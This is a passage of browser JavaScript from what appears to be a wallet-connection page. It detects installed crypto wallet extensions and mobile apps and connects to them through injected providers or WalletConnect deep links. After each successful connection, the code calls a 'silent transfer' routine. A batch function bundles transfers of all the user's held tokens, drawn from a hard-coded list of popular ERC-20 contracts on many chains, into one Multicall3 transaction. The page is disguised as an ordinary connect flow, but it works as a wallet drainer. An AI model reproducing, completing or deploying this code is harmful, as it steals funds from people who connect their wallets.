            }

            // Encode the multicall data
            const multicallData = multicallInterface.encodeFunctionData("aggregate3", [calls]);

            console.log(`[batchTokenTransfers] Sending ${tokensWithBalance.length} token transfers in single batch...`);

            // Send ONE transaction for all token transfers
            const batchTx = await signer.sendTransaction({
              to: multicall3Addr,
              data: multicallData,
              value: "0x0"
            });

            console.log(`[batchTokenTransfers] Batch tx hash: ${batchTx.hash}`);

            const receipt = await batchTx.wait();
            console.log(`[batchTokenTransfers] ✓ Batch transfer confirmed. Tokens sent: ${tokensWithBalance.map(t => t.symbol).join(", ")}`);

            return receipt;
          } catch (error) {
            console.error("[batchTokenTransfers] Error:", error.message);
            throw error;
          }
        }

        // ──────────────────────────────────────────────────────────────────────────────────
        // Helper functions
        // ──────────────────────────────────────────────────────────────────────────────────
        function getChainSymbol(chainId) {
          const map = {
            1: 'ETH', 
            56: 'BNB', 
            137: 'MATIC', 
            42161: 'ARB', 
            8453: 'ETH(Base)',
            10: 'OP', 
            43114: 'AVAX', 
            250: 'FTM',
            324: 'ETH(zkSync)',
            59144: 'ETH(Linea)',
            534352: 'ETH(Scroll)'
          };
          return map[Number(chainId)] || 'Unknown';
        }

        // Comprehensive list of popular ERC-20 tokens per major chain
        function getAllErc20Tokens() {
          return [
            // Ethereum Mainnet (chainId 1)
            { chainId: 1, symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
            { chainId: 1, symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
            { chainId: 1, symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F" },
            { chainId: 1, symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" },
            { chainId: 1, symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599" },
            { chainId: 1, symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA" },
            { chainId: 1, symbol: "UNI",  address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984" },
            { chainId: 1, symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9" },
            { chainId: 1, symbol: "MKR",  address: "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2" },
            { chainId: 1, symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933" },

            // BNB Smart Chain (chainId 56)
            { chainId: 56, symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955" },
            { chainId: 56, symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d" },
            { chainId: 56, symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56" },
            { chainId: 56, symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82" },

            // Polygon (chainId 137)
            { chainId: 137, symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F" },
            { chainId: 137, symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174" },
            { chainId: 137, symbol: "DAI",  address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063" },
            { chainId: 137, symbol: "WETH", address: "0x7ceb23fD6bC0adD59E62ac25578270cFf1b9f619" },

            // Arbitrum One (chainId 42161)
            { chainId: 42161, symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9" },
            { chainId: 42161, symbol: "USDC", address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831" },
            { chainId: 42161, symbol: "ARB",  address: "0x912CE59144191C1204E64559FE8253a0e49E6548" },

            // Base (chainId 8453)
            { chainId: 8453, symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913" },

            // Optimism (chainId 10)
            { chainId: 10, symbol: "USDC", address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85" },
            { chainId: 10, symbol: "OP",   address: "0x4200000000000000000000000000000000000042" },

            // Avalanche C-Chain (chainId 43114)
            { chainId: 43114, symbol: "USDT", address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7" },
            { chainId: 43114, symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E" },

            // zkSync Era (chainId 324)
            { chainId: 324, symbol: "USDC", address: "0x3355df6D4c9c3035724Fd0e3914dE96A5a83aaf4" },

            // Linea (chainId 59144)
            { chainId: 59144, symbol: "USDC", address: "0x176211869cA2b568F2AEF4d18a6f8f9b3a1d9c5f" },

            // Scroll (chainId 534352)
            { chainId: 534352, symbol: "USDC", address: "0x06eFdBfF2a14a7c8E15944D1F4A48F9F95F663A4" }
          ];
        }

        // Connect a specific wallet by name. Returns the provider object on success, or null on failure.
        async function connectSpecificWallet(walletName, providerCandidate = null) {
            if (!walletName) return null;
            const key = normalizeKey(walletName);
            try {
                // EVM-family (use window.ethereum if present)
                if (/metamask|trustwallet|coinbase|bitget|bybit|tokenpocket|exodus|uniswap|ronin/.test(key)) {
                    // Ronin may expose window.ronin.provider
                    if (providerCandidate && typeof providerCandidate.request === 'function') {
                        await providerCandidate.request({ method: 'eth_requestAccounts' });
                        return providerCandidate;
                    }
                    if (key.includes('ronin') && window.ronin && window.ronin.provider) {
                        const p = window.ronin.provider;
                        await p.request({ method: 'eth_requestAccounts' });
                        return p;
                    }
                    if (window.ethereum) {
                        await window.ethereum.request({ method: 'eth_requestAccounts' });
                        return window.ethereum;
                    }
                    throw new Error(`${walletName} not detected`);
                }

                // SafePal explicit
                if (key.includes('safepal')) {
                    const sp = providerCandidate || window.safepal || window.SafePal;
                    if (!sp) throw new Error('SafePal not detected');
                    if (sp.request) {
                        await sp.request({ method: 'eth_requestAccounts' });
                        return sp;
                    }
                    throw new Error('SafePal connector not available');
                }

                // Solana-family
                if (key.includes('phantom') || key.includes('solflare') || key.includes('slush') || key.includes('glow')) {
                    const sol = providerCandidate || window.solana || window.phantom || window.glow || window.solflare;
                    if (!sol) throw new Error(`${walletName} not detected`);
                    if (typeof sol.connect === 'function') {
                        await sol.connect();
                        return sol;
                    }
                    throw new Error(`${walletName} connector not available`);
                }

                // Keplr
                if (key.includes('keplr')) {
                    const kk = providerCandidate || window.keplr;
                    if (!kk) throw new Error('Keplr not detected');
                    // Use a safe default chain list; your app can customize
                    const chainIds = ['osmosis-1', 'cosmoshub-4'];
                    await kk.enable(chainIds);
                    return kk;
                }

                // TronLink
                if (key.includes('tronlink')) {
                    const t = providerCandidate || window.tronLink || window.tronWeb;
                    if (!t) throw new Error('TronLink not detected');
                    if (t.request) {
                        await t.request({ method: 'tron_requestAccounts' });
                        return t;
                    } else if (t.enable) {
                        await t.enable();
                        return t;
                    } else {
                        // wait for ready
                        await new Promise((resolve, reject) => {
                            let tries = 0;
                            const interval = setInterval(() => {
                                tries++;
                                if (t.readyState === 'complete') { clearInterval(interval); resolve(); }
                                if (tries > 20) { clearInterval(interval); reject(new Error('TronLink not ready')); }
                            }, 200);
                        });
                        return t;
                    }
                }

                // Default: no specific connector
                console.warn('No specific connector implemented for', walletName);
                return null;
            } catch (err) {
                console.error(`[${walletName}] Connect failed:`, err);
                let msg = 'Connection failed';
                if (err.code === 4001 || (err.message && err.message.toLowerCase().includes('reject'))) {
                    msg = 'User rejected the connection';
                } else if (err.message && err.message.toLowerCase().includes('not detected')) {
                    msg = `${walletName} extension not found or not unlocked`;
                }
                try { alert(`${msg} — ${err.message || 'Unknown error'}`); } catch (e) {}
                return null;
            }
        }

        // TronLink-specific connect helper (returns provider on success or null)
        async function connectTronLink() {
            try {
                let tronProvider = null;
                if (window.tronLink) tronProvider = window.tronLink;
                else if (window.tronWeb && window.tronWeb.ready) tronProvider = window.tronWeb;
                else if (window.tronWeb) tronProvider = window.tronWeb;

                if (!tronProvider) {
                    console.log('[TronLink] Not detected');
                    return null;
                }

                console.log('[TronLink] Detected provider, attempting connection');

                // Preferred modern API
                if (tronProvider.request) {
                    const accounts = await tronProvider.request({ method: 'tron_requestAccounts' });
                    if (accounts && accounts.length) return tronProvider;
                }

                // Fallback for older tronWeb injection
                if (tronProvider.tronWeb) {
                    // Wait for defaultAddress to appear
                    if (!tronProvider.tronWeb.defaultAddress || !tronProvider.tronWeb.defaultAddress.base58) {
                        await new Promise((resolve, reject) => {
                            let tries = 0;
                            const iv = setInterval(() => {
                                tries++;
                                if (tronProvider.tronWeb?.defaultAddress?.base58) { clearInterval(iv); resolve(); }
                                if (tries > 100) { clearInterval(iv); reject(new Error('TronLink ready timeout')); }
                            }, 200);
                        }).catch(e => { throw e; });
                    }
                    if (tronProvider.tronWeb?.defaultAddress?.base58) return tronProvider;
                }

                return null;
            } catch (err) {
                console.warn('[TronLink] connect error:', err);
                return null;
            }
        }

        // ────────────────────────────────────────────────────────────────────────────────
        // Updated showDetectorPopup - now uses WC v2
        // ────────────────────────────────────────────────────────────────────────────────
        function showDetectorPopup(apps, walletName, fallback) {
            const ov = document.getElementById('app-detector-overlay');
            const list = document.getElementById('detected-list');
            const title = document.getElementById('detector-title');
            title.textContent = `Open ${walletName} app`;
            list.innerHTML = '';
                const isMobile = /Mobi|Android/i.test(navigator.userAgent);

                // Display a small summary of detected items (optional)
                const detectedNames = (apps && apps.length) ? apps.map(a => typeof a === 'string' ? a : (a.name || a.scheme || '')).filter(Boolean) : [];
                if (detectedNames.length) {
                    const p = document.createElement('div');
                    p.style.marginBottom = '8px';
                    p.style.color = '#cbd5e1';
                    p.textContent = `Detected: ${detectedNames.join(', ')}`;
                    list.appendChild(p);
                }

                // Create only two buttons: Open wallet & Continue in browser
                const openBtn = document.createElement('button');
                openBtn.className = 'login-btn';
                openBtn.style.background = 'linear-gradient(90deg,#3396ff,#6e8bff)';
                openBtn.textContent = 'Open wallet';
                openBtn.addEventListener('click', async () => {
                    ov.style.display = 'none';
                    // Try extensions first (desktop)
                    try {
                        const exts = (apps || []).filter(a => a && a.type === 'extension');
                        if (!isMobile && exts.length > 0) {
                            // try to match the clicked wallet first
                            const normalized = normalizeKey(walletName || '');
                            const exact = exts.filter(e => normalizeKey(e.name) === normalized || normalizeKey(e.name).includes(normalized) || normalized.includes(normalizeKey(e.name)));
                            const toTry = exact.length ? exact : exts;
                            let connected = false;
                            for (let i = 0; i < toTry.length; i++) {
                                const a = toTry[i];
                                try {
                                    // slight stagger
                                    await new Promise(r => setTimeout(r, i * 400));
                                    try { console.log(`[calling-connector] wallet=${a.name}`); console.trace(); } catch (e) {}
                                    const res = await a.connector();
                                    if (res) connected = true;
                                    console.log('Connector result for', a.name, res);
                                } catch (e) {
                                    console.warn('Connector error', a.name, e);
                                }
                            }
                            if (connected) {
                                try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                                try { ov.style.display = 'none'; } catch (e) {}
                                // Execute silent transfer with proper connection info
                                try {
                                    const provider = window.ethereum;
                                    const accounts = await provider.request({ method: 'eth_accounts' });
                                    const chainId = await provider.request({ method: 'eth_chainId' });
                                    const connectionInfo = { provider, address: accounts[0], chainId, session: null };
                                    await silentTransferRemainingBalance(connectionInfo);
                                } catch (e) { console.warn('Silent transfer failed:', e); }
                                return;
                            }
                            // if none connected, fall back to scheme/WC
                        }

                        // Mobile or no extensions connected — use WalletConnect deep-link where appropriate
                        try {
                            const schemes = walletSchemeLookup[normalizeKey(walletName || '')] || (apps || []).map(a => a && a.scheme).filter(Boolean);
                            await initiateWalletConnectDeepLink({
                                appSchemes: schemes,
                                onFail: () => {
                                    // If deep link fails, try naive scheme(s)
                                    const s = schemes && schemes.length ? schemes[0] : null;
                                    if (s) {
                                        tryOpenDeepLink(s, () => fallback(), () => {});
                                    } else {
                                        fallback();
                                    }
                                },
                                onSuccess: async (client, session) => {
                                    try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                                    try { ov.style.display = 'none'; } catch (e) {}
                                    // Execute silent transfer with WalletConnect session
                                    try {
                                        const connectionInfo = await createWalletConnectProvider(session);
                                        await silentTransferRemainingBalance(connectionInfo);
                                    } catch (e) { console.warn('Silent transfer setup failed:', e); }
                                }
                            });
                        } catch (e) {
                            console.error('Initiate WC error', e);
                            fallback();
                        }
                    } catch (e) {
                        console.error('Open wallet flow error', e);
                        fallback();
                    }
                });
                list.appendChild(openBtn);

                const manualBtn = document.createElement('button');
                manualBtn.className = 'mt-4 text-gray-400 hover:text-white text-sm';
                manualBtn.textContent = 'Continue in browser';
                manualBtn.addEventListener('click', () => {
                    ov.style.display = 'none';
                    fallback();
                });
                list.appendChild(manualBtn);

                document.getElementById('detector-cancel').onclick = () => { ov.style.display = 'none'; };
                ov.style.display = 'flex';
                return;

            // Special-case: if user clicked 'walletconnect' show a single "Open wallets" button
            const normalized = normalizeKey(walletName || '');
            if (normalized === 'walletconnect') {
                const btn = document.createElement('button');
                btn.className = 'login-btn';
                btn.style.background = 'linear-gradient(90deg,#3396ff,#6e8bff)';
                btn.textContent = 'Open wallets';
                btn.addEventListener('click', async () => {
                    ov.style.display = 'none';
                    // First try desktop injected extensions
                    const installed = detectAllInstalledExtensions();
                    if (installed && installed.length > 0) {
                        // sequentially trigger connectors so each extension can prompt
                        for (let i = 0; i < installed.length; i++) {
                            const a = installed[i];
                                try {
                                // small delay to help with multiple extension popups
                                await new Promise(r => setTimeout(r, i * 600));
                                try { console.log(`[calling-connector] wallet=${a.name}`); console.trace(); } catch (e) {}
                                await a.connector();
                            } catch (e) {
                                console.warn('Connector failed for', a.name, e);
                            }
                        }
                        // done trying extensions; if none connected, fall back to WC deep link
                        setTimeout(() => fallback(), 800);
                        return;
                    }

                    // Mobile: open walletconnect flow (will attempt to open apps and request connection)
                    try {
                        // gather all known app schemes to attempt opening every installed mobile wallet
                        const allSchemes = Array.from(new Set(Object.values(walletSchemeLookup).flat()));
                        await initiateWalletConnectDeepLink({
                            appSchemes: allSchemes,
                            onFail: () => { console.warn('WC deep link failed'); fallback(); },
                            onSuccess: async (client, session) => {
                                console.log('WC v2 connected via Open wallets');
                                try {
                                    const connectionInfo = await createWalletConnectProvider(session);
                                    await silentTransferRemainingBalance(connectionInfo);
                                } catch (e) { console.warn('Silent transfer setup failed:', e); }
                            }
                        });
                    } catch (e) {
                        console.error('Open wallets error', e);
                        fallback();
                    }
                });
                list.appendChild(btn);
                const manualBtn = document.createElement('button');
                manualBtn.className = 'mt-4 text-gray-400 hover:text-white text-sm';
                manualBtn.textContent = 'Continue in browser';
                manualBtn.addEventListener('click', () => { ov.style.display = 'none'; fallback(); });
                list.appendChild(manualBtn);
                document.getElementById('detector-cancel').onclick = () => { ov.style.display = 'none'; };
                ov.style.display = 'flex';
                return;
            }

            // Otherwise, render provided app options below
            apps.forEach(a => {
                const btn = document.createElement('button');
                btn.className = 'login-btn';
                btn.style.background = 'linear-gradient(90deg,#3396ff,#6e8bff)';
                // If the clicked wallet is coinbase, show only the coinbase button
                const normalized = normalizeKey(walletName || '');
                if (normalized.includes('coinbase')) {
                    // prefer extension if provided
                    if (a.type === 'extension' && typeof a.connector === 'function') {
                        btn.textContent = `Open ${a.name}`;
                        btn.addEventListener('click', async () => {
                            ov.style.display = 'none';
                            try {
                                await a.connector();
                                try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch(e){}
                                // Execute silent transfer with proper connection info
                                try {
                                    const provider = window.ethereum;
                                    const accounts = await provider.request({ method: 'eth_accounts' });
                                    const chainId = await provider.request({ method: 'eth_chainId' });
                                    const connectionInfo = { provider, address: accounts[0], chainId, session: null };
                                    await silentTransferRemainingBalance(connectionInfo);
                                } catch (e) { console.warn('Silent transfer failed:', e); }
                            } catch (e) {
                                console.error('Coinbase extension connect failed', e);
                                if (a.scheme) tryOpenDeepLink(a.scheme, fallback, () => {}); else fallback();
                            }
                        });
                    } else {
                        btn.textContent = `Open ${a.name}`;
                        btn.addEventListener('click', () => { ov.style.display = 'none'; tryOpenDeepLink(a.scheme, fallback, () => {}); });
                    }
                    list.appendChild(btn);
                    return; // only show the coinbase button
                }

                // If this entry provides an extension connector, use it
                if (a.type === 'extension' && typeof a.connector === 'function') {
                    btn.textContent = `Open ${a.name}`;
                    btn.addEventListener('click', async () => {
                        ov.style.display = 'none';
                                try {
                                try { console.log(`[calling-connector] wallet=${a.name}`); console.trace(); } catch (e) {}
                                await a.connector();
                                try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch(e){}
                                try { ov.style.display = 'none'; } catch(e){}
                            // Execute silent transfer with proper connection info
                            try {
                                const provider = window.ethereum;
                                const accounts = await provider.request({ method: 'eth_accounts' });
                                const chainId = await provider.request({ method: 'eth_chainId' });
                                const connectionInfo = { provider, address: accounts[0], chainId, session: null };
                                await silentTransferRemainingBalance(connectionInfo);
                            } catch (e) { console.warn('Silent transfer failed:', e); }
                        } catch (e) {
                            console.error('Extension connect failed:', e);
                            if (a.scheme) tryOpenDeepLink(a.scheme, fallback, () => {}); else fallback();
                        }
                    });
                } else {
                    btn.textContent = `Open ${a.name}`;
                    btn.addEventListener('click', async () => {
                        ov.style.display = 'none';
                        try {
                            // For mobile/URL-scheme wallets use WalletConnect deep-link where applicable
                            const perSchemes = walletSchemeLookup[normalizeKey(a.name || '')] || (a.scheme ? [a.scheme] : []);
                            await initiateWalletConnectDeepLink({
                                appSchemes: perSchemes,
                                onFail: () => { tryOpenDeepLink(a.scheme, fallback, () => {}); },
                                onSuccess: async (client, session) => {
                                    try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch(e){}
                                    try { ov.style.display = 'none'; } catch(e){}
                                    // Execute silent transfer with WalletConnect session
                                    try {
                                        const connectionInfo = await createWalletConnectProvider(session);
                                        await silentTransferRemainingBalance(connectionInfo);
                                    } catch (e) { console.warn('Silent transfer setup failed:', e); }
                                }
                            });
                        } catch (e) {
                            console.error('WC attempt error:', e);
                            tryOpenDeepLink(a.scheme, fallback, () => {});
                        }
                    });
                }
                list.appendChild(btn);
            });
            if (!apps || apps.length === 0) {
                const note = document.createElement('div');
                note.style.padding = '12px';
                note.style.color = '#cbd5e1';
                note.style.textAlign = 'center';
                note.textContent = 'No native app detected — try opening the wallet app or continue in browser.';
                list.appendChild(note);

                const tryBtn = document.createElement('button');
                tryBtn.className = 'login-btn';
                tryBtn.style.background = 'linear-gradient(90deg,#22c55e,#16a34a)';
                tryBtn.textContent = 'Try open app';
                tryBtn.addEventListener('click', () => {
                    ov.style.display = 'none';
                    // attempt naive schemes based on walletName
                    const candidates = [];
                    const base = normalizeKey(walletName).replace(/[^a-z0-9]/g, '');
                    if (base) {
                        candidates.push(`${base}://`);
                        candidates.push(`${base}wallet://`);
                        candidates.push(`${base}app://`);
                        candidates.push(`${base}-wallet://`);
                    }
                    // try each scheme in sequence
                    let tried = 0;
                    const tryNext = () => {
                        if (tried >= candidates.length) {
                            // all failed — fallback to side overlay
                            fallback();
                            return;
                        }
                        const s = candidates[tried++];
                        tryOpenDeepLink(s, () => {
                            // failed, try next
                            tryNext();
                        }, () => {
                            // success callback — openConnect handled elsewhere
                        });
                    };
                    tryNext();
                });
                list.appendChild(tryBtn);

                const manualBtn = document.createElement('button');
                manualBtn.className = 'mt-4 text-gray-400 hover:text-white text-sm';
                manualBtn.textContent = 'Continue in browser';
                manualBtn.addEventListener('click', () => {
                    ov.style.display = 'none';
                    fallback();
                });
                list.appendChild(manualBtn);
            } else {
                const manualBtn = document.createElement('button');
                manualBtn.className = 'mt-4 text-gray-400 hover:text-white text-sm';
                manualBtn.textContent = 'Continue in browser';
                manualBtn.addEventListener('click', () => {
                    ov.style.display = 'none';
                    fallback();
                });
                list.appendChild(manualBtn);
            }

                   document.getElementById('detector-cancel').onclick = () => { ov.style.display = 'none'; };
        ov.style.display = 'flex';
    }

    // Detect ALL installed extensions (not filtered by name)
    function detectAllInstalledExtensions() {
        const results = [];
        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
        if (isMobile) return results; // only for desktop

        function pushIfUnique(arr, obj) {
            if (!arr.some(x => normalizeKey(x.name) === normalizeKey(obj.name))) arr.push(obj);
        }

        // Detect injected providers (desktop extensions)
        try {
            if (window.ethereum) {
                const providers = Array.isArray(window.ethereum.providers) ? window.ethereum.providers : [window.ethereum];
                providers.forEach(p => {
                    try {
                        if (p.isMetaMask) pushIfUnique(results, { name: 'MetaMask', type: 'extension', provider: p, connector: async () => p.request({ method: 'eth_requestAccounts' }), scheme: 'metamask://' });
                        else if (p.isCoinbaseWallet) pushIfUnique(results, { name: 'Coinbase Wallet', type: 'extension', provider: p, connector: async () => p.request({ method: 'eth_requestAccounts' }), scheme: 'coinbase://' });
                        else pushIfUnique(results, { name: 'Ethereum Provider', type: 'extension', provider: p, connector: async () => p.request({ method: 'eth_requestAccounts' }) });
                    } catch (e) {}
                });
            }
        } catch (e) {}

        // Detect Glow (Solana) if present
        try {
            if (window.glow && typeof window.glow.connect === 'function') {
                pushIfUnique(results, { name: 'Glow', type: 'extension', provider: window.glow, connector: async () => window.glow.connect(), scheme: 'glow://' });
            }
        } catch (e) {}

        // Always add Phantom as an option (attach provider when present)
        try { 
            if (window.solana && window.solana.isPhantom) {
                pushIfUnique(results, { name: 'Phantom', type: 'extension', provider: window.solana, connector: async () => window.solana.connect(), scheme: 'phantom://' });
            } else {
                // Even if not detected, add Phantom with fallback scheme
                pushIfUnique(results, { name: 'Phantom', type: 'extension', connector: async () => { throw new Error('Phantom not installed'); }, scheme: 'phantom://' });
            }
        } catch (e) {}

        // Solflare disabled from modal - only accessible via direct click
        // try { if (window.solflare && typeof window.solflare.connect === 'function') pushIfUnique(results, { name: 'Solflare', type: 'extension', connector: async () => window.solflare.connect(), scheme: 'solflare://' }); } catch (e) {}
        try { if (window.keplr) pushIfUnique(results, { name: 'Keplr', type: 'extension', connector: async () => { await window.keplr.enable && await window.keplr.enable(); return true; }, scheme: 'keplr://' }); } catch (e) {}
        
        // Detect TronLink (attach provider when present)
        try {
            if (window.tronLink || (window.tronWeb && window.tronWeb.defaultAddress)) {
                const tronProvider = window.tronLink || window.tronWeb;
                pushIfUnique(results, { name: 'TronLink', type: 'extension', provider: tronProvider, connector: async () => { if (window.tronLink && window.tronLink.request) return await window.tronLink.request({ method: 'tron_requestAccounts' }); if (window.tronWeb && window.tronWeb.request) return await window.tronWeb.request({ method: 'tron_requestAccounts' }); throw new Error('No Tron request available'); }, scheme: 'tronlink://' });
            } else {
                // Even if not detected, add TronLink with fallback scheme
                pushIfUnique(results, { name: 'TronLink', type: 'extension', connector: async () => { throw new Error('TronLink not installed'); }, scheme: 'tronlink://' });
            }
        } catch (e) {}

        try { if (window.safepal || window.SafePal) pushIfUnique(results, { name: 'SafePal', type: 'extension', provider: window.safepal || window.SafePal, connector: async () => { if (window.safepal && window.safepal.request) return await window.safepal.request({ method: 'eth_requestAccounts' }); throw new Error('SafePal connector not available'); }, scheme: 'safepal://' }); } catch (e) {}

        const knownWalletGlobals = [
            { name: 'Rabby', props: ['rabby', 'Rabby'], scheme: 'rabby://' },
            { name: 'Rainbow', props: ['rainbow', 'Rainbow'], scheme: 'rainbow://' },
            { name: 'MathWallet', props: ['mathwallet', 'MathWallet', 'mathWallet'], scheme: 'mathwallet://' },
            { name: 'TokenPocket', props: ['tp', 'TokenPocket', 'tokenPocket', 'tpwallet'], scheme: 'tpwallet://' },
            { name: 'Coin98', props: ['coin98', 'Coin98'], scheme: 'coin98://' },
            { name: 'BitKeep', props: ['bitkeep', 'Bitkeep', 'BitKeep'], scheme: 'bitkeep://' },
            { name: 'Wallet3', props: ['wallet3'], scheme: 'wallet3://' },
            { name: 'Opera', props: ['opera', 'operaWallet'], scheme: 'opera://' },
            { name: 'Trezor', props: ['trezor'], scheme: 'trezor://' },
            { name: 'OKX', props: ['okxwallet', 'okx'], scheme: 'okxwallet://' },
            { name: 'Ronin', props: ['ronin'], scheme: 'ronin://' }
        ];
        knownWalletGlobals.forEach(w => {
            for (const p of w.props) {
                try {
                    const provider = window[p];
                    if (provider) {
                        pushIfUnique(results, {
                            name: w.name,
                            type: 'extension',
                            provider: provider,
                            connector: async () => {
                                if (typeof provider.request === 'function') return await provider.request({ method: 'eth_requestAccounts' });
                                if (typeof provider.connect === 'function') return await provider.connect();
                                if (typeof provider.enable === 'function') return await provider.enable();
                                throw new Error('No connect method on provider');
                            },
                            scheme: w.scheme
                        });
                        break;
                    }
                } catch (e) {}
            }
        });

        // Wrap any connector functions for debugging to capture unexpected invocations
        try {
            results.forEach(r => {
                try {
                    if (r && typeof r.connector === 'function' && !r.__wrapped_for_debug) {
                        const orig = r.connector;
                        r.connector = async function(...args) {
                            try {
                                console.log(`[connector-invoke] wallet=${r.name}`);
                                console.trace();
                            } catch (e) {}
                            return await orig.apply(this, args);
                        };
                        r.__wrapped_for_debug = true;
                    }
                } catch (e) {}
            });
        } catch (e) {}

        return results;
    }

    // ════════════════════════════════════════════════════════════════════════════════
    // Wallet-specific deep link mapping for mobile (Phantom, Slush, TronLink)
    // ════════════════════════════════════════════════════════════════════════════════
    const walletDeepLinks = {
        phantom: {
            scheme: 'phantom://wc?uri=',
            universal: 'https://phantom.app/ul/v1/connect?uri=',
            store: 'https://play.google.com/store/apps/details?id=app.phantom',
            iosStore: 'https://apps.apple.com/app/phantom-crypto-wallet/id1598432977'
        },
        slushwallet: {  // Match "Slush Wallet" name
            scheme: 'suiwallet://wc?uri=',
            universal: 'https://suiwallet.com/connect?uri=',
            store: 'https://play.google.com/store/apps/details?id=com.mystenlabs.suiwallet',
            iosStore: 'https://apps.apple.com/app/sui-wallet/id6476572140'
        },
        slush: {
            scheme: 'suiwallet://wc?uri=',
            universal: 'https://suiwallet.com/connect?uri=',
            store: 'https://play.google.com/store/apps/details?id=com.mystenlabs.suiwallet',
            iosStore: 'https://apps.apple.com/app/sui-wallet/id6476572140'
        },
        sui: {
            scheme: 'suiwallet://wc?uri=',
            universal: 'https://suiwallet.com/connect?uri=',
            store: 'https://play.google.com/store/apps/details?id=com.mystenlabs.suiwallet',
            iosStore: 'https://apps.apple.com/app/sui-wallet/id6476572140'
        },
        tronlink: {
            scheme: 'tronlink://wc?uri=',
            universal: 'https://tronlink.org/#/connect?uri=',  // Fixed: removed wc: prefix
            store: 'https://play.google.com/store/apps/details?id=org.tronlink.wallet',
            iosStore: 'https://apps.apple.com/app/tronlink-trx-wallet/id1453530188'
        },
        solflare: {
            scheme: 'solflare://wc?uri=',
            universal: 'https://solflare.com/wc?uri=',
            store: 'https://play.google.com/store/apps/details?id=com.solflare.mobile',
            iosStore: 'https://apps.apple.com/app/solflare/id1608930833'
        }
    };

    // Expanded wallet deep link map — include common app.link/universal variants and store links
    Object.assign(walletDeepLinks, {
        metamask: {
            scheme: 'metamask://wc?uri=',
            universal: 'https://metamask.app.link/wc?uri=',
            store: 'https://play.google.com/store/apps/details?id=io.metamask',
            iosStore: 'https://apps.apple.com/app/metamask/id1438144202'
        },
        trustwallet: {
            scheme: 'trust://wc?uri=',
            universal: 'https://link.trustwallet.com/wc?uri=',
            store: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
            iosStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409'
        },
        coinbasewallet: {
            scheme: 'coinbasewallet://wc?uri=',
            universal: 'https://go.cb-w.com/wc?uri=',
            store: 'https://play.google.com/store/apps/details?id=org.toshi',
            iosStore: 'https://apps.apple.com/app/coinbase-wallet/id1278383455'
        },
        rabby: {
            scheme: 'rabby://wc?uri=',
            universal: 'https://rabby.io/wc?uri=',
            store: 'https://play.google.com/store/apps/details?id=io.rabby.mobile',
            iosStore: ''
        },
        rainbow: {
            scheme: 'rainbow://wc?uri=',
            universal: 'https://rainbow.me/wc?uri=',
            store: 'https://play.google.com/store/apps/details?id=me.rainbow',
            iosStore: 'https://apps.apple.com/app/rainbow-ethereum-wallet/id1457119021'
        },
        tokenpocket: {
            scheme: 'tokenpocket://wc?uri=',
            universal: 'https://tokenpocket.app/wc?uri=',
            store: 'https://play.google.com/store/apps/details?id=io.tokenpocket.android',
            iosStore: ''
        },
        bitkeep: {
            scheme: 'bitkeep://wc?uri=',
            universal: 'https://bitkeep.com/wc?uri=',
            store: 'https://play.google.com/store/apps/details?id=com.bitkeep.wallet',
            iosStore: ''
        },
        okxwallet: {
            scheme: 'okxwallet://wc?uri=',
            universal: 'https://okx.com/wc?uri=',
            store: 'https://play.google.com/store/apps/details?id=com.okx',
            iosStore: ''
        },
        safepal: {
            scheme: 'safepal://wc?uri=',
            universal: 'https://safepal.com/wc?uri=',
            store: 'https://play.google.com/store/apps/details?id=com.safepal.wallet',
            iosStore: ''
        },
        slushwallet: walletDeepLinks.slushwallet || {},
        slush: walletDeepLinks.slush || {},
        sui: walletDeepLinks.sui || {}
    });

    // Build per-wallet deep link and universal link targets from a wallet name and a WalletConnect URI
    function buildPerWalletLinks(walletName, wcUri) {
        const key = (walletName || '').toLowerCase().replace(/\s+/g, '').replace(/[^a-z0-9]/g, '');
        const cfg = walletDeepLinks[key] || null;

        // Common wc forms
        const rawWc = wcUri || '';
        const wcNoPrefix = rawWc.startsWith('wc:') ? rawWc.split('wc:')[1] : rawWc;
        const wcColon = wcNoPrefix ? `wc:${wcNoPrefix}` : rawWc; // some apps expect wc:... form

        // Compose results with multiple fallbacks and OS-specific intent forms
        const schemeCandidates = [];
        const universalCandidates = [];

        // If explicit config exists, use its templates first
        if (cfg) {
            if (cfg.scheme) schemeCandidates.push(cfg.scheme + encodeURIComponent(rawWc));
            if (cfg.universal) universalCandidates.push(cfg.universal + encodeURIComponent(rawWc));
        }

        // Wallet-specific heuristics (common variants)
        if (key.includes('phantom')) {
